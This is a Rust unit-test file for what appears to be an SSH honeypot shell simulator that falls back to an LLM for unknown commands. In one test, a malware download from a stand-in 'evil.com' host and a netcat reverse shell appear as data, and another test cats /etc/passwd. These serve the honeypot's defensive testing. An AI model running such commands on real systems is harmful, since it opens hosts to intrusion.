// Tests for SSH protocol handler
#[cfg(test)]
mod tests {
    use crate::protocols::ssh_shell::SshShellSimulator;
    use crate::protocols::LlmEscalationConfig;
    use crate::llm::ChatService;
    use crate::fingerprint::ServerFingerprint;

    fn test_fingerprint() -> ServerFingerprint {
        ServerFingerprint::default_static()
    }

    // Mock ChatService for testing
    #[derive(Clone)]
    struct MockChatService {
        response: String,
    }

    #[async_trait::async_trait]
    impl ChatService for MockChatService {
        async fn send_message(&self, _message: &str) -> Result<String, String> {
            Ok(self.response.clone())
        }
    }

    #[test]
    fn test_ssh_handler_creation() {
        let mock_chat = MockChatService {
            response: "mock response".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert_eq!(simulator.username, "root");
        assert_eq!(simulator.hostname, "ubuntu-server");
        assert_eq!(simulator.current_dir, "/root");
    }

    #[test]
    fn test_ssh_is_known_command_exact_match() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert!(simulator.is_known_command("ls"));
        assert!(simulator.is_known_command("pwd"));
        assert!(simulator.is_known_command("whoami"));
        assert!(simulator.is_known_command("uname -a"));
    }

    #[test]
    fn test_ssh_is_known_command_cd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert!(simulator.is_known_command("cd /tmp"));
        assert!(simulator.is_known_command("cd .."));
        assert!(simulator.is_known_command("cd"));
    }

    #[test]
    fn test_ssh_is_known_command_cat() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert!(simulator.is_known_command("cat /etc/passwd"));
        assert!(simulator.is_known_command("cat somefile.txt"));
    }

    #[test]
    fn test_ssh_is_known_command_unknown() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert!(!simulator.is_known_command("wget http://evil.com/malware"));
        assert!(!simulator.is_known_command("nc -e /bin/sh 1.2.3.4 443"));
    }

    #[test]
    fn test_ssh_get_native_response_ls() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        let response = simulator.get_native_response("ls");
        assert!(response.is_some());
        assert!(response.unwrap().contains(".bashrc"));
    }

    #[test]
    fn test_ssh_get_native_response_pwd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        let response = simulator.get_native_response("pwd");
        assert!(response.is_some());
        assert!(response.unwrap().contains("/root"));
    }

    #[test]
    fn test_ssh_get_native_response_whoami() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        let response = simulator.get_native_response("whoami");
        assert!(response.is_some());
        assert!(response.unwrap().contains("root"));
    }

    #[test]
    fn test_ssh_get_native_response_cd() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert_eq!(simulator.current_dir, "/root");

        let response = simulator.get_native_response("cd /tmp");
        assert!(response.is_some());
        assert_eq!(simulator.current_dir, "/tmp");

        let response = simulator.get_native_response("cd ..");
        assert!(response.is_some());
        assert_eq!(simulator.current_dir, "/");
    }

    #[test]
    fn test_ssh_get_native_response_unknown() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        let response = simulator.get_native_response("unknown_command");
        assert!(response.is_none());
    }

    #[test]
    fn test_ssh_get_prompt() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        let prompt = simulator.get_prompt();
        assert_eq!(prompt, "root@ubuntu-server:/root# ");
    }

    #[test]
    fn test_ssh_set_username() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let mut simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        simulator.set_username("attacker".to_string());
        assert_eq!(simulator.username, "attacker");
        assert_eq!(simulator.get_prompt(), "attacker@ubuntu-server:/root# ");
    }

    #[test]
    fn test_ssh_is_exit_command() {
        let mock_chat = MockChatService {
            response: "".to_string(),
        };
        let config = LlmEscalationConfig::default();
        let simulator = SshShellSimulator::new(mock_chat, config, test_fingerprint());

        assert!(simulator.is_exit_command("exit"));
        assert!(simulator.is_exit_command("quit"));
        assert!(simulator.is_exit_command("EXIT"));
        assert!(simulator.is_exit_command("QUIT"));
        assert!(!simulator.is_exit_command("ls"));
        assert!(!simulator.is_exit_command("pwd"));
    }
}
